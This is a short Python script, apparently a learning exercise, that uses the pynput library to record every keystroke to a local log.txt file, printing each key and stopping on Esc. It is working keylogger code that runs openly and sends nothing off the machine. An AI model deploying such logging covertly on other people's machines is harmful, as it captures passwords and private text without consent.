from pynput.keyboard import Key, Listener
import os

print("Saved to directory in:", os.getcwd())

def write_file(key):
    with open("log.txt", "a") as f:
        k = str(key).replace("'", "")

        if k == "Key.space":
            f.write(" ")
            print("[SAVED] spacja")
        elif "Key" not in k:
            f.write(k)
            print(f"[SAVED] {k}")
        else:
            print(f"[SKIPPED] {k}")

def on_press(key):
    print(f"[PRESSED] {key}")
    write_file(key)

def on_release(key):
    if key == Key.esc:
        print("END")
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() 
